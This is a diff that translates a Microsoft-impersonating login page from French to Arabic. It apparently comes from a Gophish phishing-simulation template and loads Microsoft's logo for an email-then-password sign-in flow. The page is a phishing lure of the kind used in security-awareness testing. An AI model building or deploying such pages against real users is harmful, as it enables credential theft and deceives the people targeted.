@@ -1,11 +1,11 @@
 <!-- تحرير document.querySelector('.login-header img').src = 'url_of_your_logo';  مع شعارك أو إعادة استخدام شعار Microsoft -->
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ar">
 <head>
     <meta charset="utf-8"/>
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
     <meta name="viewport" content="width=device-width, initial-scale=1"/>
-    <title>Connectez-vous à votre compte</title>
+    <title>تسجيل الدخول إلى حسابك</title>
     <link rel="shortcut icon" href="https://github.com/PassAndSecure/Template_Gophish/blob/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/logo-micro-1.png?raw=true"/>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"/>
     <style>
@@ -253,7 +253,7 @@
                 document.getElementById('password').style.display = 'block';
                 document.getElementById('password-error').style.display = 'none';
 
-                document.querySelector('.login-header p').textContent = 'Entrez le mot de passe';
+                document.querySelector('.login-header p').textContent = 'أدخل كلمة المرور';
 
                 document.querySelector('.login-header img').src = 'URL_de_votre_logo';
 
@@ -261,7 +261,7 @@
 
                 document.querySelector('.login-header').style.marginBottom = '-25px';
 
-                document.querySelector("button[type='submit']").textContent = "Se connecter";
+                document.querySelector("button[type='submit']").textContent = "تسجيل الدخول";
                 
                 const emailContainer = document.createElement('div');
                 emailContainer.classList.add('email-container');
@@ -271,7 +271,7 @@
                 backButton.onclick = function() {
                     document.getElementById('password').style.display = 'none';
                     document.getElementById('email').style.display = 'block';
-                    document.querySelector('.login-header p').textContent = 'Se connecter';
+                    document.querySelector('.login-header p').textContent = 'تسجيل الدخول';
                     document.querySelector('.login-header img').src = 'https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/microsoft_logo.svg';
 
                     document.querySelector('.login-header').style.marginBottom = '0px';
